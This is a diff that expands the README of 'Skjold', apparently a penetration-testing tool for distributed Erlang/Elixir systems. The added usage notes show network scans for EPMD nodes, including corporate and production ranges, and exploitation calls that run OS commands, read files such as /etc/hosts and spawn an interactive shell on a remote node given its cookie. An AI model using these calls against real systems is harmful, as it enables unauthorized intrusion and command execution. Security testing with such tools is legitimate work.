@@ -17,28 +17,109 @@ rebar3 escriptize
 
 ## Usage
 
-```bash
-# Scan network for Erlang nodes
-./_build/default/bin/skjold -r 192.168.1.1-254
+### Prerequisites
 
-# Custom timeout and concurrency
-./_build/default/bin/skjold -r 10.0.0.1-100 -t 2000 -c 100
+Skjold targets **distributed Erlang/Elixir systems**. You need:
+- Target nodes running with EPMD (Erlang Port Mapper Daemon)
+- Network access to port 4369 (EPMD) and distribution ports
+- Knowledge of the Erlang cookie (for enumeration/exploitation)
+
+### Local Testing
+
+```bash
+# Terminal 1: Start a test node
+erl -sname myapp -setcookie secret123
+
+# Terminal 2: Scan for it
+./_build/default/bin/skjold -r 127.0.0.1-1
 ```
 
-## Programmatic API
+### Remote Scanning
+
+```bash
+# Scan network range
+./_build/default/bin/skjold -r 192.168.1.1-254
+
+# Scan specific subnet
+./_build/default/bin/skjold -r 10.0.0.1-100 -t 2000 -c 100
+
+# Corporate network scan
+./_build/default/bin/skjold -r 172.16.0.1-254
+```
+
+### Real-World Scenarios
+
+**Phoenix/Elixir apps:**
+```bash
+# Development environments often expose EPMD
+skjold -r 192.168.1.1-254
+
+# Production clusters
+skjold -r 10.20.30.1-254 -t 5000
+```
+
+**Distributed Erlang clusters:**
+```bash
+# RabbitMQ, CouchDB, ejabberd, etc.
+skjold -r 172.16.0.1-100
+```
+
+## Programmatic Usage
+
+Start an Erlang shell with Skjold:
+
+```bash
+rebar3 shell
+```
+
+### Discovery
 
 ```erlang
-%% Discovery
+%% Scan IP range
 {ok, Hosts} = skjold_discovery:discover({"192.168.1.", 1, 254}, #{}).
 
-%% Enumeration
+%% With options
+{ok, Hosts} = skjold_discovery:discover({"192.168.1.", 1, 10}, #{
+    timeout => 2000,
+    concurrency => 100,
+    verbose => true
+}).
+```
+
+### Enumeration
+
+```erlang
+%% Enumerate single node
 {ok, Info} = skjold_enum:enumerate_node("192.168.1.5", "myapp", secret).
 
-%% Vulnerability Scan
+%% View formatted output
+io:format("~s", [skjold_enum:format_enumeration(Info)]).
+```
+
+### Vulnerability Scanning
+
+```erlang
+%% Scan for vulnerabilities
 {ok, Findings} = skjold_scan:scan_node("192.168.1.5", "myapp", secret).
 
-%% Exploitation
+%% Format findings
+io:format("~s", [skjold_scan:format_findings(Findings)]).
+```
+
+### Exploitation
+
+```erlang
+%% Execute command
 {ok, Result} = skjold_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").
+
+%% Read file
+{ok, Content} = skjold_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").
+
+%% List directory
+{ok, Files} = skjold_exploit:list_directory("192.168.1.5", "myapp", secret, "/tmp").
+
+%% Spawn interactive shell
+{ok, Pid} = skjold_exploit:spawn_shell("192.168.1.5", "myapp", secret).
 ```
 
 ## Testing
